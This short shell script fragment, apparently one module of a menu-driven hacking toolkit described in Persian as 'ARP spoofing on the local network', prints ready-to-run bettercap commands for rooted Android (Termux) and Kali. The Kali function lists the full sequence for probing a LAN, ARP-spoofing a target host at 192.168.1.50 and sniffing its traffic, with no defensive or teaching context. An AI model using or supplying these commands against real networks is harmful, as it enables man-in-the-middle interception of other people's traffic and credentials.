DESC="ARP spoofing در شبکه محلی"
RISK="HIGH"

termux(){ echo "su -c 'bettercap -iface wlan0'"; }

kali(){
cat <<'EOF'
sudo bettercap -iface eth0
# داخل شل:
net.probe on
net.show
set arp.spoof.targets 192.168.1.50
arp.spoof on
net.sniff on
EOF
}
